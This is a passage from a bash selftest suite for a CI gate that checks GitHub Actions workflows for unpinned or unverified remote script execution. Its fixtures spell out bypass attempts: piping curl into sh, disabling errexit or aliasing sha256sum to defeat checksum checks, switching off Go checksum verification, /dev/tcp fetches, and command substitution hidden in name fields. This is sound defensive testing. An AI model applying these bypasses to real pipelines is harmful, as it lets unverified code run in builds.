acc a8_ok_var_arg 'echo "$HOME" "${PWD}/x" > /dev/null'
# 3. shapes b/c: the checksum line must be able to FAIL the step
CK="echo \"$H64  i.sh\" | sha256sum -c -"
bc() { wf "$1" <<<"curl -sSfL -o i.sh $RAW
$2
$CK
bash i.sh"; badx "$1" 6 "$3"; }
bc a8_ck_set_e 'set +e' "set +e"
bc a8_ck_set_eu 'set +eu' "set +e"
bc a8_ck_errexit_off 'set +o errexit' "set +e"
bc a8_ck_func 'sha256sum() { :; }' "function definition"
bc a8_ck_func_kw 'function sha256sum { return 0; }' "function definition"
bc a8_ck_alias 'alias sha256sum=true' "alias/trap"
bc a8_ck_trap 'trap "exit 0" EXIT' "alias/trap"
bc a8_ck_ortrue 'true || true' "|| true"
bc a8_ck_orcolon 'true || :' "|| true"
bc a8_ck_if 'if false; then' "compound command"
bc a8_ck_while 'while false; do' "compound command"
bc a8_ck_case 'case x in' "compound command"
bc a8_ck_subshell '(' "compound command"
bc a8_ck_closer '}' "compound command"
bc a8_ck_brace '{' "compound command"
wf a8_ck_if_wrapped <<<"curl -sSfL -o i.sh $RAW
if false; then
$CK
fi
bash i.sh"; badx a8_ck_if_wrapped 6 "compound command"
wf a8_ck_runtime <<<"curl -sSfL -o i.sh $RAW
echo \"\$(sha256sum i.sh)\" | sha256sum -c -
bash i.sh"; badx a8_ck_runtime 6 "computed at runtime"
wf a8_ck_runtime_bt <<<"curl -sSfL -o i.sh $RAW
echo \`sha256sum i.sh\` | sha256sum -c -
bash i.sh"; badx a8_ck_runtime_bt 6 "computed at runtime"
wf a8_ck_sumfile_runtime <<<"curl -sSfL -o i.sh $RAW
sha256sum i.sh > i.sum
sha256sum -c i.sum
bash i.sh"; badx a8_ck_sumfile_runtime 6 "used before its sha256 check"
yml a8_ck_shell_0 <<<"      - shell: bash {0}
        run: |
          curl -sSfL -o i.sh $RAW
          $CK
          bash i.sh"; badx a8_ck_shell_0 6 "shell: is not the default"
yml a8_ck_shell_bash_e <<<"      - shell: bash -e {0}
        run: |
          curl -sSfL -o i.sh https://github.com/o/r/releases/download/v1.2.3/i.sh
          $CK
          bash i.sh"; good a8_ck_shell_bash_e   # PS-A9 RE-EXPECTED toward ACCEPTED: bash -e {0} runs -e
printf 'defaults:\n  run:\n    shell: bash {0}\njobs:\n  j:\n    steps:\n      - run: |\n          curl -sSfL -o i.sh %s\n          %s\n          bash i.sh\n' "$RAW" "$CK" > "$T/a8_ck_defaults_shell.y"; mkdir -p "$T/a8_ck_defaults_shell"; mv "$T/a8_ck_defaults_shell.y" "$T/a8_ck_defaults_shell/w.yaml"; badx a8_ck_defaults_shell 8 "defaults shell"
yml a8_ck_shell_bash_ok <<<"      - shell: bash
        run: |
          curl -sSfL -o i.sh $RAW
          $CK
          bash i.sh"; good a8_ck_shell_bash_ok
wf a8_ck_plain_ok <<<"curl -sSfL -o i.sh $RAW
$CK
bash i.sh"; good a8_ck_plain_ok
# 4. curl -w: a fixed set of variables plus literal text, nothing that writes or reads a file
WURL=https://example.com/x
wo() { ref "$1" "curl -sSf -o /dev/null -w $2 $WURL" "write-out format is not in the allowed set"; }
wo a8_w_output "'%output{x.sh}%header{x-p}'"
wo a8_w_output_mix "'%{http_code}%output{x.sh}'"
wo a8_w_header "'%header{x}'"
wo a8_w_json "'%{json}'"
wo a8_w_at "@fmt.txt"
wo a8_w_at_quoted "'@fmt.txt'"
wo a8_w_unknown "'%{foo}'"
wo a8_w_bare "'100%'"
wo a8_w_stderr "'%{stderr}'"
ref a8_w_long "curl -sSf -o /dev/null --write-out '%output{x.sh}' $WURL" "write-out format is not in the allowed set"
wf a8_w_then_sh <<<"curl -o /dev/null -w '%output{x.sh}%header{x-p}' $WURL
sh x.sh"; badx a8_w_then_sh 6 "write-out format is not in the allowed set"
acc a8_w_ok_code "curl -sSf -o /dev/null -w '%{http_code}\\n' $WURL"
acc a8_w_ok_mix "curl -sSf -o /dev/null -w 'code=%{response_code} t=%{time_total} %{url_effective} %{size_download}' $WURL"
# go modules: shape g is refused when the file switches checksum verification off
printf 'env:\n  GOSUMDB: off\njobs:\n  j:\n    steps:\n      - run: go install example.com/m/cmd@v1.2.3\n' > "$T/a8_gosumdb.y"; mkdir -p "$T/a8_gosumdb"; mv "$T/a8_gosumdb.y" "$T/a8_gosumdb/w.yaml"; badx a8_gosumdb 6 "checksum verification is disabled"
printf 'jobs:\n  j:\n    steps:\n      - env:\n          GOFLAGS: -mod=mod -insecure\n        run: go install example.com/m/cmd@v1.2.3\n' > "$T/a8_goflags.y"; mkdir -p "$T/a8_goflags"; mv "$T/a8_goflags.y" "$T/a8_goflags/w.yaml"; badx a8_goflags 6 "checksum verification is disabled"
acc a8_go_ok "go install example.com/m/cmd@v1.2.3"
# a workflow whose steps are all uses: is ACCEPTED (it has nothing to read), not "unparsed"
yml a8_uses_only <<<"      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5"; good a8_uses_only

# ======================= PS-A9: last round (comments, errexit spellings, name scalars, fetchers without a trigger) =======================
# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one bypass an independent validator EXECUTED with real curl, or one accepted near-miss)
# THREAT MODEL: the header of the gate states it; this case keeps the statement from being deleted.
grep -qF "NOT a sandbox against an adversarial workflow author" "$GATE"; check "the gate header states its threat model (NOT a sandbox against an adversarial workflow author)" $?
grep -qF "GOPROXY=direct" "$GATE" && grep -qF "unknown fetcher binary" "$GATE" && grep -qF "non-scanned source" "$GATE"; check "the gate header names the known residuals" $?
# 1. shell comments in a block scalar are NOT stripped (the strip desynced from bash); a comment that spells a fetch is refused
ref a9_c_brace_default "echo \${V:- #}; curl -sSfL $MAINU | sh" "mixes a variable with //"
ref a9_c_bs_space "echo a\\ #b; curl -sSfL $MAINU | sh" "does not match an accepted shape"
ref a9_c_backtick "echo \`true #\`; curl -sSfL $MAINU | sh" "command substitution"
wf a9_c_comment_line <<<"echo ok
# curl -sSfL $MAINU | sh"; badx a9_c_comment_line 7 "does not match an accepted shape"
wf a9_c_comment_plain_words <<<"# curl is not used here
echo ok"; good a9_c_comment_plain_words
# 2. errexit-disabling spellings and the checksum line that must itself fail the step
CKS="echo \"$H64  i.sh\" | sha256sum -c -"
RELU=https://github.com/o/r/releases/download/v1.2.3/i.sh
for c in "shopt -uo errexit|shopt in a checked step" "set -u +e|errexit" "set +o nounset +o errexit|errexit" "set -o pipefail|set -o / set +o"; do
  nm="a9_ck_${c%%|*}"; nm="${nm//[^A-Za-z0-9_]/_}"
  wf "$nm" <<<"${c%%|*}
curl -sSfL -o i.sh $RELU
$CKS
bash i.sh"; badx "$nm" 7 "${c#*|}"
done
wf a9_ck_set_e_plain <<<"set -e
curl -sSfL -o i.sh $RELU
$CKS
bash i.sh"; badx a9_ck_set_e_plain 7 "must end with || exit 1"
wf a9_ck_set_e_exit1 <<<"set -e
curl -sSfL -o i.sh $RELU
$CKS || exit 1
bash i.sh"; good a9_ck_set_e_exit1
wf a9_ck_file_set_e <<<"set -e
curl -sSfL -o i.sh $RELU
echo \"$H64  i.sh\" > i.sum
sha256sum -c i.sum
bash i.sh"; badx a9_ck_file_set_e 7 "must end with || exit 1"
wf a9_ck_file_set_e_exit1 <<<"set -e
curl -sSfL -o i.sh $RELU
echo \"$H64  i.sh\" > i.sum
sha256sum -c i.sum || exit 1
bash i.sh"; good a9_ck_file_set_e_exit1
wf a9_ck_file_no_set <<<"curl -sSfL -o i.sh $RELU
echo \"$H64  i.sh\" > i.sum
sha256sum -c i.sum
bash i.sh"; good a9_ck_file_no_set
yml a9_ck_sh_e <<<"      - shell: sh -e {0}
        run: |
          curl -sSfL -o i.sh $RELU
          $CKS
          sh i.sh"; good a9_ck_sh_e
yml a9_ck_bash_plus_e <<<"      - shell: bash +e {0}
        run: |
          curl -sSfL -o i.sh $RELU
          $CKS
          bash i.sh"; badx a9_ck_bash_plus_e 6 "shell: is not the default"
# 3. name: is scanned (it is reinjected by \${{ github.workflow }})
yml a9_name_subst <<<"      - name: \"build \$(id)\"
        run: echo ok"; badx a9_name_subst 4 "name scalar is reinjected"
yml a9_name_pipe <<<"      - name: a | b
        run: echo ok"; badx a9_name_pipe 4 "name scalar is reinjected"
yml a9_name_backtick <<<"      - name: build \`id\`
        run: echo ok"; badx a9_name_backtick 4 "name scalar is reinjected"
yml a9_name_trigger <<<"      - name: curl $MAINU
        run: echo ok"; badx a9_name_trigger 4 "name scalar is reinjected"
mk a9_name_job_level <<<"name: wget it
jobs:
  j:
    steps:
      - run: echo ok"; badx a9_name_job_level 1 "name scalar is reinjected"
yml a9_name_plain_ok <<<"      - name: Build the thing
        run: echo ok"; good a9_name_plain_ok
# 4. fetchers with no trigger word; pipes into interpreters; running a file the repository does not track
ref a9_gh_api_sh "gh api repos/o/r/contents/i.sh -q .content | sh" "does not match an accepted shape"
wf a9_gh_release_sh <<<"gh release download v1.2.3 -R o/r -p i.sh
sh i.sh"; badx a9_gh_release_sh 6 "does not match an accepted shape"; badx a9_gh_release_sh 7 "executes a file the repository does not track"
ref a9_git_clone "git clone o/r.git" "does not match an accepted shape"
wf a9_git_clone_run <<<"git clone o/r
bash r/i.sh"; badx a9_git_clone_run 7 "executes a file the repository does not track"
ref a9_git_archive "git archive --remote=h HEAD i.sh" "does not match an accepted shape"
ref a9_aria2c "aria2c -o i.sh example.invalid/i.sh" "does not match an accepted shape"
ref a9_devtcp "cat < /dev/tcp/example.invalid/80 > i.sh" "does not match an accepted shape"
ref a9_http_word "http example.invalid/i.sh" "does not match an accepted shape"
ref a9_https_word "https example.invalid/i.sh" "does not match an accepted shape"
ref a9_python_c "python3 -c 'import os; os.system(1)'" "program inline"
yml a9_script_fetch <<<"      - uses: actions/github-script@v7
        with:
          script: |
            const r = await fetch(u)"; badx a9_script_fetch 7 "does not match an accepted shape"
yml a9_script_child <<<"      - uses: actions/github-script@v7
        with:
          script: |
            require('child_process').execSync(x)"; badx a9_script_child 7 "does not match an accepted shape"
for c in sh bash python3 perl ruby node source eval xargs; do ref "a9_pipe_$c" "cat i.sh | $c" "pipe into an interpreter"; done
ref a9_exec_untracked_sh "sh /tmp/x.sh" "executes a file the repository does not track"
ref a9_exec_untracked_dot ". ./x.sh" "executes a file the repository does not track"
ref a9_exec_untracked_source "source x.sh" "executes a file the repository does not track"
ref a9_exec_untracked_chmod "chmod +x ./tool" "executes a file the repository does not track"
ref a9_exec_scripts_untracked "bash scripts/x.sh" "executes a file the repository does not track"
# the validator's false positives are ACCEPTED
acc a9_ok_ws_var '$GITHUB_WORKSPACE/script.sh'
acc a9_ok_ws_expr '"${{ github.workspace }}/x.sh"'
acc a9_ok_home '$HOME/.local/bin/tool --version'
acc a9_ok_echo_v 'echo "v${VERSION}"'
acc a9_ok_tar 'tar -xzf tool_${VERSION}_linux.tar.gz'
acc a9_ok_summary 'echo "Run: https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}" >> "$GITHUB_STEP_SUMMARY"'
acc a9_ok_gh_api_jq 'gh api repos/o/r/releases | jq -r .[0].tag_name'
wf a9_gh_release_latest <<<"gh release download latest -R o/r -p i.sh -O i.sh
$CKS
sh i.sh"; badx a9_gh_release_latest 6 "does not match an accepted shape"
wf a9_ok_gh_release <<<"gh release download v1.2.3 -R o/r -p i.sh -O i.sh
$CKS
sh i.sh"; good a9_ok_gh_release
# near-misses that stay REFUSED
ref a9_summary_pipe 'echo "https://x.example/i.sh" | sh' "does not match an accepted shape"
ref a9_summary_pipe2 'echo "https://x.example/i.sh" >> "$GITHUB_STEP_SUMMARY" | sh' "does not match an accepted shape"
ref a9_matrix_cmd '${{ matrix.cmd }}' "command position"
ref a9_var_cmd '$X --a' "command position"

# a file the repository TRACKS (git ls-files) may be run, with or without the workspace prefix; an untracked one may not
a9_git() {
  local g="$T/a9_git" o rc
  mkdir -p "$g/.github/workflows" "$g/scripts"; echo 'echo hi' > "$g/scripts/ok.sh"; echo 'echo hi' > "$g/scripts/loose.sh"
  git -C "$g" init -q . && git -C "$g" add scripts/ok.sh && git -C "$g" -c user.email=t@example.invalid -c user.name=t -c commit.gpgsign=false commit -qm t || { check "a9_git: scratch repository could not be built" 1; return; }
  printf 'jobs:\n  j:\n    steps:\n      - run: |\n          bash scripts/ok.sh\n          bash ./scripts/ok.sh\n          sh "$GITHUB_WORKSPACE/scripts/ok.sh"\n          chmod +x scripts/ok.sh\n' > "$g/.github/workflows/w.yaml"
  bash "$GATE" "$g/.github/workflows" >/dev/null 2>&1; check "a9_git: tracked files run with/without a workspace prefix are accepted" $?
  printf '          bash scripts/loose.sh\n' >> "$g/.github/workflows/w.yaml"
  o="$(bash "$GATE" "$g/.github/workflows" 2>&1)"; rc=$?
  [[ $rc == 1 ]] && grep -qF "w.yaml:9:" <<<"$o" && grep -qF "executes a file the repository does not track (scripts/loose.sh)" <<<"$o"; check "a9_git: an untracked file in the same repository is refused naming line 9" $?
}
a9_git

# MISSING TEST 1: an awk that fails must exit 3 with the message, never green
awk_failure_case() {
  local o rc
  mkdir -p "$T/stubbin"; printf '#!/bin/sh\necho "awk: simulated failure" >&2\nexit 2\n' > "$T/stubbin/awk"; chmod +x "$T/stubbin/awk"
  o="$(PATH="$T/stubbin:$PATH" bash "$GATE" "$REAL" 2>&1)"; rc=$?
  [[ $rc == 3 ]] && grep -qF "INTERNAL ERROR -- no summary produced" <<<"$o"; check "a failing awk exits 3 with the internal-error message" $?
}
awk_failure_case
rm -rf "$T/stubbin"

# MISSING TEST 2: the loop-run cases must cover the fixtures declared (counted from the directories, not the loop)
coverage_guard() {
  local ndirs; ndirs="$(find "$T" -mindepth 1 -maxdepth 1 -type d | wc -l | tr -d ' ')"
  if (( n < ndirs || n == 0 )); then echo "FAIL: ran $n case(s) for $ndirs fixture dir(s): a loop ran zero or too few cases" >&2; fail=$((fail+1)); fi
}
coverage_guard

if (( fail )); then echo "template-workflow-pins selftest: $fail FAILED of $n case(s)" >&2; exit 1; fi
echo "template-workflow-pins selftest: ok -- $n case(s)"
